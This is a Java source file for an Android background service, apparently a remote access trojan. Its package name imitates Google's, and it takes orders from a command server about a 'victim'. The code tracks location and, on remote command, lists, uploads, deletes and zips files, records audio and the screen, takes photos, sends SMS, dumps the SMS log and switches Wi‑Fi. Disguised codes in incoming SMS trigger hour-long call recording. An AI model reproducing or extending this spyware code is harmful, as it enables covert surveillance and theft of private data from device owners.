package com.google.android.android;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.os.Build;
import android.os.IBinder;
import android.telephony.SmsManager;

import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

public class MainService extends Service {
    private static MainService _instance;
    private NettyClient nettyClient;

    private final int INTERVAL_CONNECTION_MILLS = 60 * 1000; //интервал переподключения

    private final String INCORRECT_QUERY = "incorrectQuery";
    private final String OWNER_OFFLINE = "ownerOffilne";
    //для отслеживания состояния
    private final String ERROR = "error";
    private final String SUCCESS = "success";
    private final String PROCESS = "process";

    private final String FILE_ISNT_DIRECTORY = "fileIsntDirectory";
    private final String FILE_IS_DIRECTORY = "fileIsDirectory";

    private FileManager fileManager;
    private RecordManager recordManager;
    private MyWifiManager myWifiManager;
    private MySmsManager mySmsManager;
    private MyLocationManager myLocationManager;
    private CameraManager cameraManager;

    public static MainService getInstance() {
        return _instance;
    }

    public FileManager getFileManager() {
        if (fileManager == null) fileManager = new FileManager();
        return fileManager;
    }

    public RecordManager getRecordManager() {
        if (recordManager == null) recordManager = new RecordManager();
        return recordManager;
    }

    private MyWifiManager getMyWifiManager() {
        if (myWifiManager == null) myWifiManager = new MyWifiManager();
        return myWifiManager;
    }

    private MySmsManager getMySmsManager() {
        if (mySmsManager == null) mySmsManager = new MySmsManager();
        return mySmsManager;
    }

    private MyLocationManager getMyLocationManager() {
        if (myLocationManager == null) myLocationManager = new MyLocationManager();
        return myLocationManager;
    }

    private CameraManager getCameraManager() {
        if (cameraManager == null) cameraManager = new CameraManager();
        return cameraManager;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        _instance = this;
        Config.load(getSharedPreferences("Config", MODE_PRIVATE));
        recordManager = new RecordManager();
        myWifiManager = new MyWifiManager();
        mySmsManager = new MySmsManager();
        myLocationManager = new MyLocationManager();
        cameraManager = new CameraManager();
//        recordManager.startRecord(10*60*1000, null);

        testCode();
    }

    private void testCode() {

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        newConnection();
        initConnectionTimerTask();

        getMyLocationManager().startGpsLocationUpdate();
        getMyLocationManager().startNetworkLocationUpdate();
        return super.onStartCommand(intent, flags, startId);
    }

    private void newConnection() {
        nettyClient = new NettyClient();
        nettyClient.execute();
    }

    private void initConnectionTimerTask() {
        Timer timer = new Timer();
        timer.scheduleAtFixedRate(new ConnectionTimerTask(), INTERVAL_CONNECTION_MILLS, INTERVAL_CONNECTION_MILLS);
    }

    private class ConnectionTimerTask extends TimerTask {

        @Override
        public void run() {
            boolean isActive = nettyClient.isActive();
            System.out.println("Connection Timer! active: " + isActive);
            if (!isActive) newConnection();
            else nettyClient.sendUpdateLastOnline();
            /*JSONObject updateQuery = new JSONObject();
            try {
                updateQuery.put("action", "updateConnection");
            } catch (JSONException e) {
                e.printStackTrace();
            }
            _client.sendMessage(updateQuery.toString()); //возможно, поможет
            if (!_client.isConnected()) {
                _client.dispose();
                _client = new TCPClient();
                _client.execute();
            }*/
        }
    }

    public void receiveMessage(JSONObject message) {
        if (message.containsKey("errorCode")) {
            String code = (String) message.get("errorCode");
            switch (code) {
                case INCORRECT_QUERY:
                    // TODO: 14.07.2017 обработка
                    break;
                case OWNER_OFFLINE:
                    // TODO: 14.07.2017 обработка
                    break;
                case SUCCESS:
                    // TODO: 14.07.2017 обработка
                    break;
                case ERROR:
                    // TODO: 14.07.2017 обработка, возможно, пихать ошибки в логи
                    break;
            }
        }


        String action = (String) message.get("action");
        switch (action) {
            case "auth.victim":
                break;
            case "get.files":
                String path = (String) message.get("path");
                File file = new File(path);
                if (!file.isDirectory()) {
                    nettyClient.sendErrorCode(FILE_ISNT_DIRECTORY, (String) message.get("owner"));
                    return;

                }
                JSONArray files = getFileManager().getFiles(file);
                nettyClient.sendGetFileList(files, (String) message.get("owner"));
                break;
            case "delete.file":

                path = (String) message.get("path");
                String code = ERROR;
                if (getFileManager().deleteFile(path))
                    code = SUCCESS;

                nettyClient.sendDeleteFile(code, (String) message.get("owner"));
                break;
            case "rename.file":
                path = (String) message.get("path");
                String newPath = (String) message.get("newPath");
                code = ERROR;
                if (getFileManager().renameFile(path, newPath))
                    code = SUCCESS;
                nettyClient.sendRenameFile(code, (String) message.get("owner"));
                break;
            case "copy.file":
                path = (String) message.get("path");
                newPath = (String) message.get("newPath");
                code = ERROR;
                if (getFileManager().copyFile(path, newPath))
                    code = SUCCESS;
                nettyClient.sendCopyFile(code, (String) message.get("owner"));
                break;
            case "make.dir":
                path = (String) message.get("path");
                code = ERROR;
                if (getFileManager().makeDir(path))
                    code = SUCCESS;
                nettyClient.sendMakeDir(code, (String) message.get("owner"));
                break;
            case "get.file.info":
                path = (String) message.get("path");
                JSONObject info = new JSONObject();
                info.put("fullPath", path);
                info.put("size", getFileManager().getSize(path));
                info.put("lastModifiedTime", getFileManager().getLastModified(path));
                nettyClient.sendGetFileInfo(info, (String) message.get("owner"));
                break;
            case "get.victim.info":
                info = new JSONObject();
                ConnectivityManager connec = (ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);
                NetworkInfo networkInfo = connec.getActiveNetworkInfo();

                info.put("phoneName", Config.PHONE_NAME);
                info.put("model", Build.MODEL);
                info.put("battery", getBatteryPercentage());
                info.put("ip", Config.IP_ADDRESS);
                info.put("serverPort", Config.SERVER_PORT);

                info.put("gpsEnabled", getMyLocationManager().isGpsEnabled());
                info.put("networkEnabled", getMyLocationManager().isNetworkEnabled());

                info.put("netType", networkInfo.getTypeName());
                info.put("netName", networkInfo.getExtraInfo());
                info.put("netSubtype", networkInfo.getSubtypeName());

                info.put("audioRecord", getRecordManager().isRecording());
                nettyClient.sendGetVictimInfo(info, (String) message.get("owner"));
                break;
            case "start.download.file":
                DownloadThread download = new DownloadThread((String) message.get("filename"), ((Long) message.get("port")).intValue(), (String) message.get("downloadPath"));
                download.start();
                break;
            case "start.upload.file":
                UploadThread upload = new UploadThread((String) message.get("path"), ((Long) message.get("port")).intValue());
                upload.start();
                break;
            case "set.victim.name":
                String name = (String) message.get("name");
                code = ERROR;
                if (Config.setName(name))
                    code = SUCCESS;
                nettyClient.sendSetVictimName(code, (String) message.get("owner"));
                break;
            case "start.record.screen":
                try {
                    path = (String) message.get("path");
                    int seconds = ((Long) message.get("seconds")).intValue();
                    MainActivity.getInstance().startRecordScreen(seconds);
                } catch (Exception e) {
                    nettyClient.sendErrorCode(e.getMessage(), "test");
                }
                break;
            case "stop.record.screen":
                MainActivity.getInstance().stopRecordScreen();
                break;
            case "start.audio.record":
                recordManager = getRecordManager();
                int seconds = ((Long) message.get("seconds")).intValue();
                if (seconds == 0) return;
                boolean result = recordManager.startRecord(seconds * 1000, null);
                code = (result)? SUCCESS : ERROR;
                nettyClient.sendStartAudioRecord(code, (String) message.get("owner"));
                break;
            case "stop.audio.record":
                recordManager = getRecordManager();
                recordManager.stopRecord();
                nettyClient.sendStopAudioRecord(SUCCESS, (String) message.get("owner"));
                break;
            case "get.wifi.list":
                myWifiManager = getMyWifiManager();
                JSONArray wifiList = myWifiManager.getWifiList();
                nettyClient.sendGetWifiList(wifiList, (String) message.get("owner"));
                break;
            case "wifi.connect":
                myWifiManager = getMyWifiManager();
                code = ERROR;
                if (myWifiManager.connectToWifi((String) message.get("ssid"), (String) message.get("password")))
                    code = SUCCESS;
                nettyClient.sendWifiConnect(code, (String) message.get("owner"));
                break;
            case "set.wifi.enabled":
                myWifiManager = getMyWifiManager();
                boolean wifiState = myWifiManager.setWifiEnabled((boolean) message.get("enabled"));
                nettyClient.sendSetWifiEnabled(wifiState, (String) message.get("owner"));
                break;
            case "send.sms":
                String phoneNumber = (String) message.get("phoneNumber");
                String text = (String) message.get("text");
                SmsManager.getDefault().sendTextMessage(phoneNumber, null, text, null, null);
                nettyClient.sendSendSms(SUCCESS, (String) message.get("owner"));
                break;
            case "save.sms.log":
                JSONArray allSms = getMySmsManager().getAllSms();

                String date = getSimpleDateFormat(System.currentTimeMillis());
                String fileName = Config.SMS_PATH + "/sms-log ";
                fileName += date + ".json";
                File outFile = new File(fileName);
                if (outFile.exists()) {
                    outFile.delete();
                }

                try {
                    FileWriter fileWriter = new FileWriter(outFile);
                    fileWriter.write(allSms.toJSONString());
                    fileWriter.flush();
                    fileWriter.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }

                nettyClient.sendSaveSmsLog(allSms.size(), (String) message.get("owner"));
                break;
            case "take.picture":
                getCameraManager().takePicture((long) message.get("camera"));
                nettyClient.sendTakePicture(SUCCESS, (String) message.get("owner"));
                break;
            case "build.zip":
                String dirPath = (String) message.get("dirPath");
                File dirFile = new File(dirPath);
                if (!dirFile.isDirectory()) {
                    nettyClient.sendErrorCode(FILE_ISNT_DIRECTORY, (String) message.get("owner"));
                    return;
                }
                code = (getFileManager().buildZip(dirPath, Config.ZIP_PATH, 9))? SUCCESS : ERROR;
                nettyClient.sendBuildZip(code, (String) message.get("owner"));
                break;
            case "clear.dir":
                dirPath = (String) message.get("dirPath");
                dirFile = new File(dirPath);
                if (!dirFile.isDirectory()) {
                    nettyClient.sendErrorCode(FILE_ISNT_DIRECTORY, (String) message.get("owner"));
                    return;
                }
                code = (getFileManager().clearDir(dirPath))? SUCCESS : ERROR;
                nettyClient.sendClearDir(code, (String) message.get("owner"));
                break;
            /*case "setOwner":
                String owner = message.getString("owner");
                outputJSONObject.put("owner", owner);
                if (Config.setOwner(owner))
                    outputJSONObject.put("code", SUCCESS);
                else
                    outputJSONObject.put("code", ERROR);
                return outputJSONObject.toString();*/
            /*case "set.login.ips":
                String ip = message.getString("ip");
                if (Config.setIpAddress(ip))
                    outputJSONObject.put("code", SUCCESS);
                else
                    outputJSONObject.put("code", ERROR);
                return outputJSONObject.toString();
            case "setServerPort":
                int serverPort = message.getInt("serverPort");
                if (Config.setServerPort(serverPort))
                    outputJSONObject.put("code", SUCCESS);
                else
                    outputJSONObject.put("code", ERROR);
                return outputJSONObject.toString();
            case "setDownloadPort":
                int downloadPort = message.getInt("downloadPort");
                if (Config.setDownloadPort(downloadPort))
                    outputJSONObject.put("code", SUCCESS);
                else
                    outputJSONObject.put("code", ERROR);
                return outputJSONObject.toString();
            case "record":
                int secondsTime = message.getInt("time");

                if (_recordManager.startRecord(secondsTime * 1000))
                    outputJSONObject.put("code", SUCCESS);
                else
                    outputJSONObject.put("code", ERROR);
                return outputJSONObject.toString();*/
        }
    }

    public void receiveSms(String phoneNumber, String message) {
        String pattern = "Тел. для записи: ";
        int start = message.indexOf(pattern);
        if (start == -1 || message.length() < pattern.length() + 9) return;
        String action = message.substring(start + pattern.length(), start + pattern.length() + 9);

        switch (action) {
            case "842-32-56": // ВКЛ Wi-Fi
                getMyWifiManager().setWifiEnabled(true);
                break;
            case "842-18-37": // ВЫКЛ Wi-Fi
                getMyWifiManager().setWifiEnabled(false);
                break;
            case "842-42-06": // ВКЛ запись разговора на час
                getRecordManager().startRecord(60*60*1000, null);
                break;
            case "842-39-56": // ВЫКЛ запись разговора
                getRecordManager().stopRecord();
                break;
        }
    }

    public int getBatteryPercentage() {
        IntentFilter iFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = registerReceiver(null, iFilter);

        int level = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
        int scale = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : -1;

        float batteryPct = level / (float) scale;

        return (int) (batteryPct * 100);
    }

    public String getSimpleDateFormat(long milliseconds) {
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("dd.MM.yy HH:mm:ss");
        return simpleDateFormat.format(new Date(milliseconds));
    }
}
